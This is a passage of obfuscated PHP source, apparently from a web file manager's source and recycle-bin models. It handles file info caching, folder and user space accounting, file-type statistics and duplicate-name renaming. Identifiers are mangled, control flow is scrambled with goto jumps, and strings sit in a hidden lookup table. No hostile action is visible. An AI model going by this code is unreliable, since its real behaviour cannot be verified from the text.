($fÈ¥œ±ñ…˜[$bÇ¬ğÒë[78]] == 0) { return $bÇ¬ğÒë[33]; } $dÙĞ¯Âá…¨ = $bÇ¬ğÒë[2003] . $fÈ¥œ±ñ…˜[$bÇ¬ğÒë[170]]; if ($fÈ¥œ±ñ…˜[$bÇ¬ğÒë[78]] <= 1024 * 10) { $cºÜ¤ÁÍ° = Cache::get($dÙĞ¯Âá…¨); if (!$cºÜ¤ÁÍ°) { $cºÜ¤ÁÍ° = IO::getContent($fÈ¥œ±ñ…˜[$bÇ¬ğÒë[76]]); Cache::set($dÙĞ¯Âá…¨, $cºÜ¤ÁÍ°); } return $cºÜ¤ÁÍ°; } goto Díã·ÄØğ’; Díã·ÄØğ’: if (!$fÈ¥œ±ñ…˜[$bÇ¬ğÒë[76]]) { return $bÇ¬ğÒë[33]; } return IO::getContent($fÈ¥œ±ñ…˜[$bÇ¬ğÒë[76]]); goto EõÊ†å¼ô; F¾Ñ¥ˆ—Ó¬: $bÇ¬ğÒë =& $_SERVER[ä°„ä°º]; $fÈ¥œ±ñ…˜ = $this->fileInfoGet($Cª¦ØñÀä—); if (!$fÈ¥œ±ñ…˜) { return !1; } goto FÈÀ˜¸º•; EõÊ†å¼ô: } public function setDesc($Dêó‹†‰¶, $c‹¯Èİ¨) { $Fîø‚îñ±Â =& $_SERVER[ä°„ä°º]; Model($Fîø‚îñ±Â[546])->eventAddDesc($Dêó‹†‰¶, $c‹¯Èİ¨); return $this->metaSet($Dêó‹†‰¶, $Fîø‚îñ±Â[431], $c‹¯Èİ¨); } public function setContent($AºØÌ¬õİ„, $cóÒÆŠ‘ = '') { goto Fèå™šÇ›ğ; Fèå™šÇ›ğ: $dª‚Â¦¨ =& $_SERVER[ä°„ä°º]; $a°»Ú„ÔÆ… = $this->sourceInfo($AºØÌ¬õİ„); $fªÍÀñåÕ = $this->fileInfoGet($AºØÌ¬õİ„); goto bÄõ‰Íå»™; E¹½†Ï»Ü«: if (!$c†¾£…È¦) { return Model($dª‚Â¦¨[450])->remove($cÛÁ¯¦šÑ[$dª‚Â¦¨[447]]); } $this->folderSizeReset($a°»Ú„ÔÆ…[$dª‚Â¦¨[478]]); return !0; goto c¾øœ××ï·; bÄõ‰Íå»™: if (!$fªÍÀñåÕ || !$a°»Ú„ÔÆ…) { return !1; } $cÛÁ¯¦šÑ = Model($dª‚Â¦¨[450])->addFileByContent($cóÒÆŠ‘, $a°»Ú„ÔÆ…[$dª‚Â¦¨[28]]); $c†¾£…È¦ = $this->fileHistory($a°»Ú„ÔÆ…, $cÛÁ¯¦šÑ[$dª‚Â¦¨[447]], $cÛÁ¯¦šÑ[$dª‚Â¦¨[78]]); goto E¹½†Ï»Ü«; c¾øœ××ï·: } public function fileSubstr($a‘ÅøŒ•¨ø, $aÇ„–¹õñŸ, $aì˜İÒî¬Ú) { $a®Å™¬æº = $this->fileInfoGet($a‘ÅøŒ•¨ø); if (!$a®Å™¬æº) { return !1; } return IO::fileSubstr($a®Å™¬æº[$_SERVER[ä°„ä°º][76]], $aÇ„–¹õñŸ, $aì˜İÒî¬Ú); } public function fileInfoGet($a¡÷ÊØ‚é) { goto A¸¸¬àŒ¶; D»ÊœÒá: $E£ê²›ßÖ = $b†ìÚ×„ªÖ[453] . $f˜í­÷¢ŠŒ[$b†ìÚ×„ªÖ[447]]; $aÜ«„¡®–Õ = _get(self::$cacheFileInfo, $E£ê²›ßÖ); if ($aÜ«„¡®–Õ) { return $aÜ«„¡®–Õ; } goto dÓÁ¹¦¹â; A¸¸¬àŒ¶: $b†ìÚ×„ªÖ =& $_SERVER[ä°„ä°º]; $f˜í­÷¢ŠŒ = $this->sourceInfo($a¡÷ÊØ‚é); if (!$f˜í­÷¢ŠŒ || $f˜í­÷¢ŠŒ[$b†ìÚ×„ªÖ[403]]) { return !1; } goto D»ÊœÒá; f‘‡Ğëõƒ´: return $DŞ¯¬«®; goto Bè„¥šÂƒÛ; dÓÁ¹¦¹â: $DŞ¯¬«® = Model($b†ìÚ×„ªÖ[450])->fileInfo($f˜í­÷¢ŠŒ[$b†ìÚ×„ªÖ[447]]); if ($DŞ¯¬«®) { $DŞ¯¬«®[$b†ìÚ×„ªÖ[28]] = $f˜í­÷¢ŠŒ[$b†ìÚ×„ªÖ[28]]; } self::$cacheFileInfo[$E£ê²›ßÖ] = $DŞ¯¬«®; goto f‘‡Ğëõƒ´; Bè„¥šÂƒÛ: } private function folderChildrenNumber($få•‚À—±) { $AãÆ­ñ¹¶Ê =& $_SERVER[ä°„ä°º]; $f¼àÆ¨âîÃ = $this->sourceInfo($få•‚À—±); $b¼°´¦ÔõÉ = array($AãÆ­ñ¹¶Ê[566] => array($AãÆ­ñ¹¶Ê[525], $f¼àÆ¨âîÃ[$AãÆ­ñ¹¶Ê[502]] . $få•‚À—± . $AãÆ­ñ¹¶Ê[526]), $AãÆ­ñ¹¶Ê[422] => intval($f¼àÆ¨âîÃ[$AãÆ­ñ¹¶Ê[423]]), $AãÆ­ñ¹¶Ê[559] => 1); $b·±†Ú¹Æõ = $this->where($b¼°´¦ÔõÉ)->count(); $E µÛó£÷ = $this->where($b¼°´¦ÔõÉ)->where(array($AãÆ­ñ¹¶Ê[559] => 0))->count(); return array($AãÆ­ñ¹¶Ê[82] => $E µÛó£÷, $AãÆ­ñ¹¶Ê[83] => $b·±†Ú¹Æõ); } public function pathInfo($AƒàäñíÊ, $E´ÔêÛÓçù = false) { goto CÁ¹¾©¦Àø; CÁ¹¾©¦Àø: $Aî¬ÓÅ¶ƒæ =& $_SERVER[ä°„ä°º]; $E´ÔêÛÓçù = !1; $AƒàäñíÊ = intval($AƒàäñíÊ); goto aö¨Ê÷×‰; A§¼±¬Òµõ: self::$cachePathInfo[$B£˜¡¿…Áç] = $C¶Œâ¤ÏË; return $C¶Œâ¤ÏË; goto B—Ø£¨®ƒá; BÛ¼ºßŠÍ­: $C¶Œâ¤ÏË = $this->sourceInfo($AƒàäñíÊ); if (!$C¶Œâ¤ÏË) { return !1; } $C¶Œâ¤ÏË = $this->_listDataApplyItem($C¶Œâ¤ÏË, $E´ÔêÛÓçù); goto A§¼±¬Òµõ; aö¨Ê÷×‰: $B£˜¡¿…Áç = $Aî¬ÓÅ¶ƒæ[439] . intval($E´ÔêÛÓçù) . $Aî¬ÓÅ¶ƒæ[440] . $AƒàäñíÊ; $D ‹ÇÁ¦…á = _get(self::$cachePathInfo, $B£˜¡¿…Áç); if ($D ‹ÇÁ¦…á) { return $D ‹ÇÁ¦…á; } goto BÛ¼ºßŠÍ­; B—Ø£¨®ƒá: } public static $cachePathInfoMore = array(); public function pathInfoMore($b´¡…·ˆ“ä) { goto Dİ•†ÛĞÖé; Dİ•†ÛĞÖé: $aº‰¾‹‘¼Ô =& $_SERVER[ä°„ä°º]; $AºÕ·âí‚£ = _get(self::$cachePathInfoMore, $b´¡…·ˆ“ä); if ($AºÕ·âí‚£) { return $AºÕ·âí‚£; } goto BŒ“‹ŞÜô¿; BŒ“‹ŞÜô¿: $d¥ÓĞêƒ™ = $this->pathInfo($b´¡…·ˆ“ä); if (!$d¥ÓĞêƒ™) { return !1; } if ($d¥ÓĞêƒ™[$aº‰¾‹‘¼Ô[403]] == $aº‰¾‹‘¼Ô[87]) { $d¥ÓĞêƒ™[$aº‰¾‹‘¼Ô[81]] = $this->folderChildrenNumber($b´¡…·ˆ“ä); } goto BĞ‹ßÖƒÉ…; BĞ‹ßÖƒÉ…: self::$cachePathInfoMore[$b´¡…·ˆ“ä] = $d¥ÓĞêƒ™; return $d¥ÓĞêƒ™; goto EªâöÌì°ï; EªâöÌì°ï: } public function sourceInfo($bçóÌÜ‹”) { goto a–àõÁÄ»å; f„ÉíøÆÏÜ: $eíäù¸½À = $aóŠÁÌêÜ[438] . $bçóÌÜ‹”; $FÍ÷äë²Æ = _get(self::$cacheSourceInfo, $eíäù¸½À); if ($FÍ÷äë²Æ) { return $FÍ÷äë²Æ; } goto d¥ç®îÛ‚; a–àõÁÄ»å: $aóŠÁÌêÜ =& $_SERVER[ä°„ä°º]; if (!$bçóÌÜ‹”) { return array(); } $bçóÌÜ‹” = intval($bçóÌÜ‹”); goto f„ÉíøÆÏÜ; d¥ç®îÛ‚: $E¥”»¹°ùã = $this->where(array($aóŠÁÌêÜ[395] => $bçóÌÜ‹”))->find(); self::$cacheSourceInfo[$eíäù¸½À] = $E¥”»¹°ùã; return self::$cacheSourceInfo[$eíäù¸½À]; goto B’ëæÆ²¥‡; B’ëæÆ²¥‡: } public function sourceCacheClear($B¨‡—¾Ş® = false) { self::cacheClear($B¨‡—¾Ş®); } public static function cacheClear($D¥¹É¬Üæù = false) { $D’ˆ•¸é =& $_SERVER[ä°„ä°º]; if ($D¥¹É¬Üæù == !1) { goto BÄĞË«Æ¤¥; BÄĞË«Æ¤¥: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto F†Ü‘ãÓ£™; F†Ü‘ãÓ£™: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto CÖã™Ú‰°í; CÖã™Ú‰°í: return; goto fŒ„ëğœ ˜; fŒ„ëğœ ˜: } unset(self::$cacheSourceInfo[$D’ˆ•¸é[438] . $D¥¹É¬Üæù]); unset(self::$cachePathInfoMore[$D¥¹É¬Üæù]); unset(self::$cachePathInfo[$D’ˆ•¸é[2004] . $D¥¹É¬Üæù]); unset(self::$cachePathInfo[$D’ˆ•¸é[2005] . $D¥¹É¬Üæù]); } public function metaSet($f»·¿¥ó‰, $fâİ…†ÆˆŠ = null, $d‚áÕÁãŠ = null) { $DÅßË¥šœ‚ = parent::metaSet($f»·¿¥ó‰, $fâİ…†ÆˆŠ, $d‚áÕÁãŠ); if ($DÅßË¥šœ‚) { $this->sourceCacheClear($f»·¿¥ó‰); } return $DÅßË¥šœ‚; } public function pathInfoByPath($Eùøğà‘çò, $bóò–é‘Õ™) { $e†ØšÀµ =& $_SERVER[ä°„ä°º]; $FóÆ·Ê’‡ä = !$bóò–é‘Õ™ ? array() : explode($e†ØšÀµ[8], trim($bóò–é‘Õ™, $e†ØšÀµ[8])); $EÚ‘‹œ¢š¤ = $Eùøğà‘çò; foreach ($FóÆ·Ê’‡ä as $F‹²×ƒİË) { $E¼ŠÚİİ¦ä = array($e†ØšÀµ[478] => $EÚ‘‹œ¢š¤, $e†ØšÀµ[28] => $F‹²×ƒİË); $d‹¼Ë¢‰Ê— = $this->where($E¼ŠÚİİ¦ä)->select(); if (!$d‹¼Ë¢‰Ê—) { return !1; } $d‹¼Ë¢‰Ê— = array_sort_by($d‹¼Ë¢‰Ê—, $e†ØšÀµ[423]); $EÚ‘‹œ¢š¤ = $d‹¼Ë¢‰Ê—[0][$e†ØšÀµ[395]]; } return $this->pathInfo($EÚ‘‹œ¢š¤, !0); } protected function updateModifyTime($aĞ®¾‰ø¤Ú) { goto f¨…’È„Ó®; f¨…’È„Ó®: $aºñ¦¹˜ã =& $_SERVER[ä°„ä°º]; $eÌÓÑê½†¼ = defined($aºñ¦¹˜ã[454]) ? USER_ID : $aºñ¦¹˜ã[191]; if (!$aĞ®¾‰ø¤Ú) { return; } goto FÁ¸½ÃÁ£¿; FÁ¸½ÃÁ£¿: if (!is_array($aĞ®¾‰ø¤Ú)) { $aĞ®¾‰ø¤Ú = array($aĞ®¾‰ø¤Ú); } foreach ($aĞ®¾‰ø¤Ú as $fÖÀ¼¶Ø¤Û => $c¤‰èå×‘) { $aĞ®¾‰ø¤Ú[$fÖÀ¼¶Ø¤Û] = intval($c¤‰èå×‘); $this->sourceCacheClear($c¤‰èå×‘); } $dÆĞñîî‰ = array($aºñ¦¹˜ã[395] => array($aºñ¦¹˜ã[7], $aĞ®¾‰ø¤Ú)); goto e”¸ˆĞ§‘æ; e”¸ˆĞ§‘æ: $e—™Í×Û©£ = array($aºñ¦¹˜ã[565] => $eÌÓÑê½†¼, $aºñ¦¹˜ã[417] => time()); $this->where($dÆĞñîî‰)->save($e—™Í×Û©£); goto e¥£’»„•¨; e¥£’»„•¨: } public function folderSizeReset($c¿»‚â†µÃ, $CÃñÁ‘ƒÂƒ = false) { goto a©ÏùÛĞö; C÷Í°Âä®: $e–ùàˆÖØ› = $D¬­ª¬Àê[2006] . $c¿»‚â†µÃ; CacheLock::lock($e–ùàˆÖØ›, 20); if ($CÃñÁ‘ƒÂƒ === !1) { $this->sourceCacheClear($c¿»‚â†µÃ); $DÁ……°öÙ© = $this->sourceInfo($c¿»‚â†µÃ); $E¥ßñ· „¿ = array($D¬­ª¬Àê[394] => $c¿»‚â†µÃ, $D¬­ª¬Àê[422] => 0); $Fï´øäÙ« = $this->where($E¥ßñ· „¿)->sum($D¬­ª¬Àê[78]); $CÃñÁ‘ƒÂƒ = intval($Fï´øäÙ«) - intval($DÁ……°öÙ©[$D¬­ª¬Àê[78]]); } goto C¬Ë°©†Œ¼; a©ÏùÛĞö: $D¬­ª¬Àê =& $_SERVER[ä°„ä°º]; if ($this->statusIgnoreResetSpace) { return; } $DÁ……°öÙ© = $this->sourceInfo($c¿»‚â†µÃ); goto C÷Í°Âä®; C¬Ë°©†Œ¼: if ($CÃñÁ‘ƒÂƒ == 0) { return CacheLock::unlock($e–ùàˆÖØ›); } $CŠ¤ŒœíÑ = $this->parentLevelArray($DÁ……°öÙ©[$D¬­ª¬Àê[502]]); if (!$CŠ¤ŒœíÑ) { $CŠ¤ŒœíÑ = array(); } goto fç¹à•ôœ; fç¹à•ôœ: $CŠ¤ŒœíÑ[] = $DÁ……°öÙ©[$D¬­ª¬Àê[395]]; $E¥ßñ· „¿ = array($D¬­ª¬Àê[395] => array($D¬­ª¬Àê[411], $CŠ¤ŒœíÑ)); if ($CÃñÁ‘ƒÂƒ < 0) { $E¥ßñ· „¿[$D¬­ª¬Àê[78]] = array($D¬­ª¬Àê[994], abs($CÃñÁ‘ƒÂƒ)); } goto d×¶‰ÊÇŒ£; cŠ˜øÊÜñï: $E¥‡·ö¿®Ô = array($DÁ……°öÙ©[$D¬­ª¬Àê[404]], $DÁ……°öÙ©[$D¬­ª¬Àê[484]]); TaskRun::timeLimitCall($A¡¼£»«Öª, $D¬­ª¬Àê[2008], $E¥‡·ö¿®Ô, 1.5); goto EÅÕòß; d×¶‰ÊÇŒ£: $this->where($E¥ßñ· „¿)->setAdd($D¬­ª¬Àê[78], $CÃñÁ‘ƒÂƒ); CacheLock::unlock($e–ùàˆÖØ›); $A¡¼£»«Öª = $D¬­ª¬Àê[2007] . $DÁ……°öÙ©[$D¬­ª¬Àê[404]] . $D¬­ª¬Àê[4] . $DÁ……°öÙ©[$D¬­ª¬Àê[484]]; goto cŠ˜øÊÜñï; EÅÕòß: } public function folderSizeResetChildren($e¯¾¢æ«ö) { goto Dö«›ëÑ—Ê; bÑ«öª³›: $Eàùºœ‹Â[$fù„çóãé¨[403]] = 0; $BÓÔä¨¶Ó— = $this->field($C¯—Œì‚œ)->where($Eàùºœ‹Â)->select(); if (!$BÓÔä¨¶Ó—) { return; } goto Bä ë³ÒÈ; C«¬ñ¦Â˜È: foreach ($ešÓÁëĞì as $cÅŒ÷íì¤¼) { if ($cÅŒ÷íì¤¼[$fù„çóãé¨[78]] == $cÅŒ÷íì¤¼[$fù„çóãé¨[2010]]) { continue; } $Açóó¨ÎÄ[] = array($fù„çóãé¨[395], $cÅŒ÷íì¤¼[$fù„çóãé¨[395]], $fù„çóãé¨[78], $cÅŒ÷íì¤¼[$fù„çóãé¨[78]]); } $this->saveAll($Açóó¨ÎÄ); goto D¯³×•ôñ³; Dö«›ëÑ—Ê: $fù„çóãé¨ =& $_SERVER[ä°„ä°º]; $this->sourceCacheClear($e¯¾¢æ«ö); $E“—ßå—´ = $this->sourceInfo($e¯¾¢æ«ö); goto f‚œ¼ø«ƒÂ; f‚œ¼ø«ƒÂ: $Eàùºœ‹Â = array($fù„çóãé¨[559] => 1, $fù„çóãé¨[566] => array($fù„çóãé¨[525], $E“—ßå—´[$fù„çóãé¨[502]] . $e¯¾¢æ«ö . $fù„çóãé¨[526])); $C¯—Œì‚œ = $fù„çóãé¨[2009]; $ešÓÁëĞì = $this->field($C¯—Œì‚œ)->where($Eàùºœ‹Â)->select(); goto bÑ«öª³›; Bä ë³ÒÈ: $ešÓÁëĞì[] = $E“—ßå—´; $ešÓÁëĞì = array_to_keyvalue($ešÓÁëĞì, $fù„çóãé¨[395]); foreach ($ešÓÁëĞì as $cé”µİŒ´ => $cÅŒ÷íì¤¼) { $ešÓÁëĞì[$cé”µİŒ´][$fù„çóãé¨[2010]] = $ešÓÁëĞì[$cé”µİŒ´][$fù„çóãé¨[78]]; $ešÓÁëĞì[$cé”µİŒ´][$fù„çóãé¨[78]] = 0; } goto cÛ˜“ˆğô; cÛ˜“ˆğô: foreach ($BÓÔä¨¶Ó— as $cÅŒ÷íì¤¼) { $bÊŠ»¯“Œå = $cÅŒ÷íì¤¼[$fù„çóãé¨[478]] . $fù„çóãé¨[33]; if (!isset($ešÓÁëĞì[$bÊŠ»¯“Œå])) { continue; } if ($cÅŒ÷íì¤¼[$fù„çóãé¨[423]] == $ešÓÁëĞì[$bÊŠ»¯“Œå][$fù„çóãé¨[423]]) { $ešÓÁëĞì[$bÊŠ»¯“Œå][$fù„çóãé¨[78]] += $cÅŒ÷íì¤¼[$fù„çóãé¨[78]]; } } foreach ($ešÓÁëĞì as $cÅŒ÷íì¤¼) { $B´‹÷¾¥¸Ü = $this->parentLevelArray($cÅŒ÷íì¤¼[$fù„çóãé¨[502]]); foreach ($B´‹÷¾¥¸Ü as $bÊŠ»¯“Œå) { $bÊŠ»¯“Œå = $bÊŠ»¯“Œå . $fù„çóãé¨[33]; if (!isset($ešÓÁëĞì[$bÊŠ»¯“Œå])) { continue; } if ($cÅŒ÷íì¤¼[$fù„çóãé¨[423]] == $ešÓÁëĞì[$bÊŠ»¯“Œå][$fù„çóãé¨[423]]) { $ešÓÁëĞì[$bÊŠ»¯“Œå][$fù„çóãé¨[78]] += $cÅŒ÷íì¤¼[$fù„çóãé¨[78]]; } } } $Açóó¨ÎÄ = array(); goto C«¬ñ¦Â˜È; D¯³×•ôñ³: } public function userSpaceReset($dÄ‹ãÊØåº = false) { $Cõäœ°İ‡… =& $_SERVER[ä°„ä°º]; $DÈÆË½¨Ç× = $this->where(array($Cõäœ°İ‡…[404] => self::TYPE_USER, $Cõäœ°İ‡…[484] => $dÄ‹ãÊØåº, $Cõäœ°İ‡…[403] => 0))->sum($Cõäœ°İ‡…[78]); $DÈÆË½¨Ç× = !$DÈÆË½¨Ç× || $DÈÆË½¨Ç× <= 0 ? 0 : $DÈÆË½¨Ç×; Model($Cõäœ°İ‡…[494])->userEdit($dÄ‹ãÊØåº, array($Cõäœ°İ‡…[1706] => $DÈÆË½¨Ç×)); } public function targetSpaceUpdate($b¿ÒèøËİ®, $EÓØÛÚ‘š…) { $EŠİ‰’Ú½ =& $_SERVER[ä°„ä°º]; if (!$EÓØÛÚ‘š…) { return; } if (!in_array($b¿ÒèøËİ®, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $E´ÚŞîêÇ = $this->targetSpaceSize($b¿ÒèøËİ®, $EÓØÛÚ‘š…); if ($b¿ÒèøËİ® == self::TYPE_USER) { Model($EŠİ‰’Ú½[494])->userEdit($EÓØÛÚ‘š…, array($EŠİ‰’Ú½[1706] => $E´ÚŞîêÇ)); } else { if ($b¿ÒèøËİ® == self::TYPE_GROUP) { Model($EŠİ‰’Ú½[503])->groupEdit($EÓØÛÚ‘š…, array($EŠİ‰’Ú½[1706] => $E´ÚŞîêÇ)); } } } public function targetSpaceSize($e“šÜ¿Ï, $cØÍõ™ó’») { goto cŠÔ¶•‘Î; E¸½‚¢ôâÈ: $a­µö±ñÑ· = !$a­µö±ñÑ· || $a­µö±ñÑ· <= 0 ? 0 : $a­µö±ñÑ·; return $a­µö±ñÑ·; goto Aè»îé§–à; cŠÔ¶•‘Î: $e¬±¤˜İ‰ =& $_SERVER[ä°„ä°º]; $E‚ Şé ¡ = $this->sourceRoot($e“šÜ¿Ï, $cØÍõ™ó’», !0); if (!$E‚ Şé ¡) { return 0; } goto b²ÄÇ¢; FÓ¹Æˆ’Ü·: $AŒì¬àìŸ = array_to_keyvalue($AŒì¬àìŸ, $e¬±¤˜İ‰[33], $e¬±¤˜İ‰[395]); $AŒì¬àìŸ = array_unique(array_filter($AŒì¬àìŸ)); if ($AŒì¬àìŸ) { $Bò¿ÕŒ«¬Õ = array($e¬±¤˜İ‰[410] => array($e¬±¤˜İ‰[411], $AŒì¬àìŸ)); $a­µö±ñÑ· += floatval($this->where($Bò¿ÕŒ«¬Õ)->sum($e¬±¤˜İ‰[78])); } goto E¸½‚¢ôâÈ; b²ÄÇ¢: $a­µö±ñÑ· = floatval($E‚ Şé ¡[$e¬±¤˜İ‰[78]]); $Bò¿ÕŒ«¬Õ = array($e¬±¤˜İ‰[566] => array($e¬±¤˜İ‰[525], $e¬±¤˜İ‰[512] . $E‚ Şé ¡[$e¬±¤˜İ‰[395]] . $e¬±¤˜İ‰[526])); $AŒì¬àìŸ = Model($e¬±¤˜İ‰[421])->field($e¬±¤˜İ‰[410])->where($Bò¿ÕŒ«¬Õ)->select(); goto FÓ¹Æˆ’Ü·; Aè»îé§–à: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($B”Şõ…À‰) { return $this->fileTypeProfile($B”Şõ…À‰, SourceModel::TYPE_USER); } public function groupFileTypeProfile($eÓöò£„í¹) { return $this->fileTypeProfile($eÓöò£„í¹, SourceModel::TYPE_GROUP); } private function fileTypeProfile($FÜ‚çĞ×, $CŞÃ­‡àó‰) { goto d¯âõŠÄŒ; EÒ½Ê½—°‘: $Aˆ³³Òà‹¦ = array(); $Aˆ³³Òà‹¦[$fŠÌÎß’Ë»[2012]] = array($fŠÌÎß’Ë»[2013] => LNG($fŠÌÎß’Ë»[2012]), $fŠÌÎß’Ë»[2014] => $this->where($dË‰²Öåš£)->count(), $fŠÌÎß’Ë»[561] => $this->where($dË‰²Öåš£)->sum($fŠÌÎß’Ë»[78])); $b„ãÖ¤“¦ = KodIO::fileTypeList(); goto CĞ‘‰‹ä¹; d¯âõŠÄŒ: $fŠÌÎß’Ë» =& $_SERVER[ä°„ä°º]; $fŒ½Â•Ù½Í = $fŠÌÎß’Ë»[2011] . $FÜ‚çĞ× . $fŠÌÎß’Ë»[71] . $CŞÃ­‡àó‰; $cøˆ˜“ö©¬ = Cache::get($fŒ½Â•Ù½Í); goto c‚ˆÁÄ; c‚ˆÁÄ: if ($cøˆ˜“ö©¬) { return $cøˆ˜“ö©¬; } $dË‰²Öåš£ = array($fŠÌÎß’Ë»[559] => 0); if ($FÜ‚çĞ× != !1) { $dË‰²Öåš£[$fŠÌÎß’Ë»[484]] = $FÜ‚çĞ×; $dË‰²Öåš£[$fŠÌÎß’Ë»[404]] = $CŞÃ­‡àó‰; } goto EÒ½Ê½—°‘; CĞ‘‰‹ä¹: foreach ($b„ãÖ¤“¦ as $d•©Ò‚ì¼è => $aÂ‹À·×ôö) { $dË‰²Öåš£[$fŠÌÎß’Ë»[405]] = $this->fileTypeWhere($d•©Ò‚ì¼è); $Aˆ³³Òà‹¦[$d•©Ò‚ì¼è] = array($fŠÌÎß’Ë»[2013] => $aÂ‹À·×ôö[$fŠÌÎß’Ë»[28]], $fŠÌÎß’Ë»[2014] => $this->where($dË‰²Öåš£)->count(), $fŠÌÎß’Ë»[561] => $this->where($dË‰²Öåš£)->sum($fŠÌÎß’Ë»[78])); } Cache::set($fŒ½Â•Ù½Í, $Aˆ³³Òà‹¦, 1200); return $Aˆ³³Òà‹¦; goto eøäÄå‹«; eøäÄå‹«: } public function fileNameExist($BéÖ‡”¿—Ì, $E¿ñŞóšíƒ) { $dÒ¯ÛâíÔİ =& $_SERVER[ä°„ä°º]; $E¸ğ”³¦Ìš = $this->where(array($dÒ¯ÛâíÔİ[478] => $BéÖ‡”¿—Ì, $dÒ¯ÛâíÔİ[28] => $E¿ñŞóšíƒ, $dÒ¯ÛâíÔİ[423] => 0))->find(); return is_array($E¸ğ”³¦Ìš) ? $E¸ğ”³¦Ìš[$dÒ¯ÛâíÔİ[395]] : !1; } public function childList($Bª½µšæä) { goto b‹¶…¢Î÷î; AÍ¹‡Â¨§¾: self::$cacheChildList[$eí²ÆƒóÛå] = $CâŒŒ¯»®„; foreach ($CâŒŒ¯»®„ as $E§ÕÚ†ÆĞ³) { $eí²ÆƒóÛå = $a˜Ô¸ŞŞ§³[438] . $E§ÕÚ†ÆĞ³[$a˜Ô¸ŞŞ§³[395]]; self::$cacheSourceInfo[$eí²ÆƒóÛå] = $E§ÕÚ†ÆĞ³; } return $CâŒŒ¯»®„; goto dŒËïô‘á; b‹¶…¢Î÷î: $a˜Ô¸ŞŞ§³ =& $_SERVER[ä°„ä°º]; $eí²ÆƒóÛå = $a˜Ô¸ŞŞ§³[1989] . $Bª½µšæä; if (isset(self::$cacheChildList[$eí²ÆƒóÛå])) { return self::$cacheChildList[$eí²ÆƒóÛå]; } goto C‰¿ÅŸÔŒê; C‰¿ÅŸÔŒê: $DŞâÒÊƒ† = array($a˜Ô¸ŞŞ§³[478] => intval($Bª½µšæä), $a˜Ô¸ŞŞ§³[423] => 0); $CâŒŒ¯»®„ = $this->where($DŞâÒÊƒ†)->select(); $CâŒŒ¯»®„ = $CâŒŒ¯»®„ ? $CâŒŒ¯»®„ : array(); goto AÍ¹‡Â¨§¾; dŒËïô‘á: } public function fileNameAuto($B½Æ‘ŠÙ×à, $dí¯Ç˜ˆ£, $eòªÆÑ¼ï© = REPEAT_RENAME, $eƒ¯·òÊÉ¥ = false) { $F’É‡í ã´ =& $_SERVER[ä°„ä°º]; $B¹Í•²Ãêë = array($F’É‡í ã´[478] => $B½Æ‘ŠÙ×à, $F’É‡í ã´[423] => 0, $F’É‡í ã´[28] => array($F’É‡í ã´[380], $dí¯Ç˜ˆ£ . $F’É‡í ã´[381])); $dœå¶÷£®á = $this->field($F’É‡í ã´[28])->where($B¹Í•²Ãêë)->select(); $cëÄƒ¥³Ë½ = array_to_keyvalue($dœå¶÷£®á, $F’É‡í ã´[33], $F’É‡í ã´[28]); return $this->fileNameAutoGet($cëÄƒ¥³Ë½, $dí¯Ç˜ˆ£, $eòªÆÑ¼ï©, $eƒ¯·òÊÉ¥); } public function fileNameAutoGet($DóÆ¦×Èˆâ, $eô„ ùÔá¿, $c—‘……›º², $A›¿Ÿç·”¦) { $e³¹ŒÎ¯÷´ =& $_SERVER[ä°„ä°º]; if ($c—‘……›º² == REPEAT_REPLACE || !$DóÆ¦×Èˆâ || !in_array_not_case($eô„ ùÔá¿, $DóÆ¦×Èˆâ) || $A›¿Ÿç·”¦ && $c—‘……›º² != REPEAT_RENAME_FOLDER) { return $eô„ ùÔá¿; } if ($c—‘……›º² == REPEAT_SKIP) { return !1; } $cÙÕóÚ¡ = $e³¹ŒÎ¯÷´[95] . get_path_ext($eô„ ùÔá¿); $cÙÕóÚ¡ = $cÙÕóÚ¡ == $e³¹ŒÎ¯÷´[95] || $A›¿Ÿç·”¦ ? $e³¹ŒÎ¯÷´[33] : $cÙÕóÚ¡; for ($Dˆ…´ÈãŸ = 1; $Dˆ…´ÈãŸ <= count($DóÆ¦×Èˆâ) + 1; $Dˆ…´ÈãŸ++) { $C‚™øë®÷ = substr($eô„ ùÔá¿, 0, strlen($eô„ ùÔá¿) - strlen($cÙÕóÚ¡)); $F–İÈòù­ = $C‚™øë®÷ . "\x28{$Dˆ…´ÈãŸ}\51{$cÙÕóÚ¡}"; if (!in_array_not_case($F–İÈòù­, $DóÆ¦×Èˆâ)) { return $F–İÈòù­; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\x75\x72\143\x65\x5f\162\145\143\x79\x63\154\x65"; protected $dataAuto = array(array("\x63\x72\x65\141\164\145\x54\x69\155\x65", "\x74\151\155\145", "\151\156\163\145\x72\x74", "\146\x75\156\x63\x74\x69\x6f\x6e")); public function listData($a¨ŒÑ‘Àãë = false) { $DØÕ„Íçï— =& $_SERVER[ä°„ä°º]; $a¨ŒÑ‘Àãë = $a¨ŒÑ‘Àãë ? $a¨ŒÑ‘Àãë : USER_ID; $Dî”¤£óØ­ = $this->where(array($DØÕ„Íçï—[1542] => $a¨ŒÑ‘Àãë))->select(); return array_to_keyvalue($Dî”¤£óØ­, $DØÕ„Íçï—[33], $DØÕ„Íçï—[395]); } public function moveToRecycle($eöáÚ«—) { goto F‘õİã±Ê‡; AÇÏÉ¶¸¹: $this->recycleMove($eöáÚ«—, 1); if ($fŠ­¯ª•‹µ[$B¡¡¤®¨İæ[403]] == $B¡¡¤®¨İæ[87]) { $D×¬ˆ—»¼¬ = array($B¡¡¤®¨İæ[566] => array($B¡¡¤®¨İæ[525], $fŠ­¯ª•‹µ[$B¡¡¤®¨İæ[502]] . $eöáÚ«— . $B¡¡¤®¨İæ[526])); $DÔÃÔ¡¨É…->where($D×¬ˆ—»¼¬)->setField($B¡¡¤®¨İæ[423], 1); } goto FÆ¢ ·ÈÍà; aªõçï¥ê: if (!$fŠ­¯ª•‹µ || $fŠ­¯ª•‹µ[$B¡¡¤®¨İæ[423]] == $B¡¡¤®¨İæ[87]) { return; } $d´Ò—àñÀõ = array($B¡¡¤®¨İæ[410] => $eöáÚ«—, $B¡¡¤®¨İæ[1542] => USER_ID, $B¡¡¤®¨İæ[562] => $fŠ­¯ª•‹µ[$B¡¡¤®¨İæ[404]], $B¡¡¤®¨İæ[563] => $fŠ­¯ª•‹µ[$B¡¡¤®¨İæ[484]], $B¡¡¤®¨İæ[566] => 